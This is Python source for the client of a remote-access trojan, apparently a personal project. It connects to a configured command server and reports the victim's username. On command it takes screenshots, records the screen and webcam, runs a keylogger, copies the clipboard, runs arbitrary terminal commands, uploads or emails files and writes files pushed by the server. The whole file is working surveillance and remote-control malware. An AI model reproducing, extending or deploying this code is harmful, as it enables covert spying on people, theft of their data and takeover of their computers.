from Functions import *
import json
import pickle
from time import time
from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from shutil import make_archive

# ==================================================================================================

class Communicator:
    def __init__(self):
        self.debug = True
        self.getConstants()
        self.header = self.constants['headerSize']
        self.address = (self.constants["server"], self.constants["port"])
        self.format = self.constants['format']
        self.buffer = self.constants['bufferSize']
        self.pingInfo = {
            'message': self.constants['pingMessage'],
            'interval': self.constants['pingInterval'],
            'tolerance': self.constants['pingTolerance'],
            'correct': 0,
            'incorrect': 0,
            'totalSent': 0
        }
        self.keyLogger = KeyLogger()
        self.client = socket(AF_INET, SOCK_STREAM)
        self.initializeClient()

    def getConstants(self):
        with open(r"C:\Ishaan\Programming\Python\Trojan\Constants.json") as file:
            data = json.load(file)
        self.path = data["FilePath"]
        self.constants = data["FTP"]

    def initializeClient(self):
        while True:
            try:
                self.client.connect(self.address)
                self.send('NAME', os.path.expanduser('~').split('\\')[2])
                self.connected = True
                self.pingInfo['correct'] = 0
                self.pingInfo['incorrect'] = 0
                self.pingInfo['totalSent'] = 0
            except:
                if self.debug: print('Couldn\'t connect')
            else:
                Thread(target=self.ping).start()
                self.recieve()

    def disconnectClient(self):
        self.client.close()
        if self.debug: print('Disconnected')
        self.connected = False

    def refresh(self):
        self.disconnectClient()
        if self.debug: print('Reconnecting')
        self.initializeClient()

    def ping(self):
        startTime = time()
        while self.connected:
            if time() < startTime + self.pingInfo['interval']: continue
            temp = self.pingInfo['totalSent'] - self.pingInfo['correct'] - self.pingInfo['incorrect']
            if temp > self.pingInfo['tolerance']:
                if self.debug: print('Ping tolerance Exceded')

            self.send('PING', self.pingInfo['message'])
            self.pingInfo['totalSent'] += 1
            startTime = time()

    def send(self, msgType, message, debug=False):
        message = pickle.dumps((msgType, message))
        size = len(message)
        # sent = 0
        header = f"{size:<{self.header}}".encode(self.format)
        if debug:
            print('Sending')
        try:
            self.client.send(header)
            # while size > self.buffer:
            #     sent += self.client.send(message[sent: sent+self.buffer])
            #     size -= self.buffer
            #     print(sent, 'sent', '\t', size, 'left')
            # sent += self.client.send(message[sent:])
            self.client.send(message)
            if debug:
                print('sent')
            return True
        except:
            if debug: print('ERROR')
            return False

    def sendFile(self, fileName, filePath, delete=False, debug=False):
        if not os.path.exists(filePath):
            if debug: print(f'File {filePath} does not exist')
            return self.send('UPDATE', f'File {filePath} does not exist')

        zipping = False
        if os.path.isdir(filePath):
            filePath = make_archive(fileName, 'zip', filePath)
            fileName += '.zip'
            zipping = True

        if debug: print(f'Sending {fileName}')
        with open(filePath, 'rb') as file:
            data = file.read()
        status = self.send('FILE', (fileName, data))

        del data
        if not status: self.send(msgType='UPDATE', message=f'couldn\'t send {fileName}', debug=debug)
        if debug and status: self.send(msgType='UPDATE', message=f'sent {fileName}', debug=debug)
        if (delete and status) or zipping: os.remove(filePath)
        return status

    def recieve(self):
        print(f'[CONNECTION]:\t{self.address} connected')
        while self.connected:
            try:
                try: msgLength = int(self.client.recv(self.header).decode(self.format))
                except: continue
                if not msgLength: continue

                message = b''
                # while msgLength > self.buffer: message += self.client.recv(self.buffer)
                message += self.client.recv(msgLength)
                msgType, message = pickle.loads(message)

                if self.debug: print(msgType, message, type(message))

                if msgType == 'UPDATE' and message == self.constants['disconnectMessage']:
                    self.disconnectClient()
                    break

                elif msgType == 'PING':
                    if message == self.pingInfo['message']: self.pingInfo['correct'] += 1
                    else: self.pingInfo['incorrect'] += 1

                else: self.handle(msgType, message)
            except: pass

    def handle(self, msgType, message):
        if msgType == 'COMMAND':
            if type(message) == str:
                if message == 'ScreenShot':
                    fileName = screenShot()
                    return self.sendFile(fileName=fileName, filePath=self.path+fileName, delete=True, debug=self.debug)

                elif message == 'SystemInformation':
                    fileName = systemInfo()
                    return self.sendFile(fileName=fileName, filePath=self.path+fileName, delete=True, debug=self.dubug)

            elif type(message) == tuple:
                if message[0] == 'ScreenRecording':
                    fileName = screenRecording(*message[1], sendFunction=self.send, debug=self.debug)
                    return self.sendFile(fileName=fileName, filePath=self.path+fileName, delete=True, debug=self.debug)

                elif message[0] == 'WebCamRecording':
                    fileName = webCamRecording(*message[1], sendFunction=self.send, debug=self.debug)
                    return self.sendFile(fileName=fileName, filePath=self.path+fileName, delete=True, debug=self.debug)

                elif message[0] == 'KeyLogger':
                    running = message[1]
                    self.keyLogger.newSessionMarker()
                    self.keyLogger.running = running

                elif message[0] == 'ClipBoardCopying':
                    duration = message[1]
                    Thread(target=copyClipBoard, args=(duration, self.debug)).start()

                elif message[0] == 'ExecuteInTerminal':
                    try: message = executeInTerminal(message[1], debug=self.debug)
                    except: message = ('ERROR', 'Some Error occurred while executing the command')
                    return self.send(*message, debug=self.debug)

                elif message[0] == 'SendFile':
                    fileName, path = message[1]
                    return self.sendFile(fileName=fileName, filePath=path, delete=False, debug=self.debug)

                elif message[0] == 'MailFile':
                    fileName, path = message[1]
                    if not os.path.exists(path):
                        if self.debug: print(f'File {path} does not exist')
                        return self.send('UPDATE', f'File {path} does not exist')

                    zipping = False
                    if os.path.isdir(path):
                        path = make_archive(fileName, 'zip', path)
                        fileName += '.zip'
                        zipping = True

                    if self.debug:
                        print(f'Sending {fileName}')
                    status = sendEmail(
                        subject=f'{fileName}', text='Sent by Trojan', filename=fileName, filePath=path)
                    if not status:
                        self.send(
                            msgType='UPDATE', message=f'couldn\'t send {fileName}', debug=self.debug)
                    if self.debug and status:
                        self.send(msgType='UPDATE',
                                  message=f'mailed {fileName}', debug=self.debug)

                    if zipping:
                        os.remove(path)
                    return status

        elif msgType == 'FILE':
            fileName, path, data = message[1]
            counter = 0
            while os.path.exists(path):
                counter += 1
                path = path.split('.')
                path = '.'.join(path[:-1]) + f'({counter})' + path[-1]
            del counter
            with open(path, 'wb') as file:
                file.write(data)
            self.send('UPDATE', f'{fileName} recieved sucessfully', debug=self.debug)

        else: print(msgType, message)


# ==================================================================================================
# if __name__ == '__main__':
comm = Communicator()
